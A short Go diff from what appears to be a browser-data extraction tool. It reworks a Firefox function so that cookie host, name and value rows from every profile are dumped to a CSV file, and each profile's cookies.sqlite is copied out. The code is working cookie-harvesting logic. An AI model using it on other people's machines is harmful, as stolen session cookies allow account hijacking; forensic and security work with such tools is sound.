@@ -75,14 +75,17 @@ func FirefoxBooks() (string, error) {
 	}
 	return builder.String(), nil
 }
-func FirefoxCookies(targetDir string) (string, error) {
-	var builder strings.Builder
+func FirefoxCookies(targetDir string) ([][]string, error) {
+
+	var CSVData [][]string
+
 	// 获取 BrowserPath 下的所有目录
 	directories, err := os.ReadDir(FirefoxPath)
 	if err != nil {
 		fmt.Printf("Failed to read directory %s: %v\n", BrowserPath, err)
-		return "", nil
+		return nil, nil
 	}
+	CSVData = append(CSVData, []string{"host", "name", "value"})
 	for _, dirEntry := range directories {
 		if !dirEntry.IsDir() {
 			continue
@@ -96,11 +99,11 @@ func FirefoxCookies(targetDir string) (string, error) {
 		}
 		utils.CopyFile(filePath, targetDir+"\\"+"cookies.sqlite")
 
-		result, _ := utils.ReadSQLiteDB(filePath, "SELECT host,name,value FROM moz_cookies ")
+		CSVData, _ = utils.ReadSQLiteDB(filePath, "SELECT host,name,value FROM moz_cookies ", CSVData)
 
-		builder.WriteString(result)
+		//builder.WriteString(result)
 	}
-	return builder.String(), nil
+	return CSVData, nil
 }
 func FirefoxSave(path string) {
 	if _, err := os.Stat(FirefoxPath); os.IsNotExist(err) {
@@ -127,10 +130,11 @@ func FirefoxSave(path string) {
 			fmt.Println()
 		}
 	}
-	if cookies != "" {
-		outputFile := FirefoxBrowserName + "_cookies.txt"
-		if err := utils.WriteToFile(cookies, targetDir+"\\"+outputFile); err != nil {
-			fmt.Println()
+	if len(cookies) > 1 {
+		outputFile := FirefoxBrowserName + "_cookies.csv"
+		if err := utils.WriteDataToCSV(targetDir+"\\"+outputFile, cookies); err != nil {
+			fmt.Println("Error writing to file:", err)
+			return
 		}
 
 	}
